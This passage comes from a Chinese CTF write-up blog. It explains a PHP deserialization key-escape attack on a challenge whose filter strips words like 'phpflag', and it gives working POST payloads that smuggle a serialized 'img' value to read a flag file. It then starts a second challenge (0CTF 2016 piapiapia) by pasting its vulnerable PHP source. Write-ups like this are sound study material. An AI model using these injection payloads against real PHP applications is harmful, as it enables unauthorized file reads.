class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先  分析代码块</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个是会把php、flag、php5、php4和fl1g过滤为空字符串  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br></pre></td></tr></table></figure>

<p>这里可以找到一点信息 能看phpinfo</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210816165533719.png" alt="image-20210816165533719"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span><br></pre></td></tr></table></figure>

<p>这里是最后得到flag的地方</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure>

<p>我们不能直接给**$_SESSION[‘img’]<strong>赋值。因为</strong>$_SESSION[‘img’]**赋值是在extract()变量覆盖的后面执行的</p>
<p>考虑到</p>
<p>反序列化的对象逃逸问题一般分为两种</p>
<blockquote>
<p>第一种为关键词数增加 例如： where-&gt;hacker，这样词数由五个增加到6个<br>第二种为关键词数减少<br>例如：直接过滤掉一些关键词，例如这道题目中</p>
<p>第一种情况比较好构造，直接构造多个关键词，这样就能逃出几个字符<br>第二种可以是通过键逃逸和值逃逸</p>
<p><strong>键值逃逸</strong></p>
<ul>
<li>因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。</li>
<li>并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号<code>&#123;&#125;</code>外的就都被扔掉。</li>
</ul>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>&#125;</span><br><span class="line">ZDBnM19mMWFnLnBocA==也就是d0g3_f1ag.php的base64加密。</span><br><span class="line">s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;这个肯定就是我们预期的那段序列化字符，</span><br></pre></td></tr></table></figure>

<p><code> ;s:1:“1”;</code><br>现在的_SESSION就存在两个键值即phpflag和img对应的键值对。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">var_dump( serialize(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">#&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>经过filter函数过滤后phpflag就会被替换成空，<br><code>s:7:&quot;phpflag&quot;;s:48:&quot; 就变成了 s:7:&quot;&quot;;s:48:&quot;;</code>即完成了逃逸。<br>两个键值分别被序列化成了<br><code>s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;</code>即键名叫<code>&quot;;s:48: </code>对应的值为一个字符串<code>1</code><br><code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>键名img对应的字符串是<code>d0g3_f1ag.php</code>的base64编码。<br>右花括号后面的<code>;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</code>全被当成孤儿放弃了。<br>post提交这一串payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>



<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210816165729323.png" alt="image-20210816165729323"></p>
<p>继续换参数编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210816165656003.png" alt="image-20210816165656003"></p>
<p>反思：</p>
<p>1.反序列化理解不够，代码审计 不够仔细</p>
<p>2.对于键值逃逸不了解 其他类型的对象逃逸也了解不多</p>
<p>3.还是见识少</p>
<blockquote>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44632787/article/details/119185112?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">https://blog.csdn.net/weixin_44632787/article/details/119185112?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46230755/article/details/111995528?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">https://blog.csdn.net/qq_46230755/article/details/111995528?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control</a></p>
</blockquote>
<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824200443319.png" alt="image-20210824200443319"></p>
<p>看一看 扫一扫  </p>
<p>注册登录传文件没有卵用  </p>
<p>备份文件扫得到  </p>
<p>下载下来审计源码   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$key_list</span> = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		<span class="variable">$value_list</span> = <span class="keyword">Array</span>(<span class="variable">$username</span>, md5(<span class="variable">$password</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === md5(<span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> user();</span><br><span class="line"><span class="variable">$user</span>-&gt;connect(<span class="variable">$config</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Login</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span 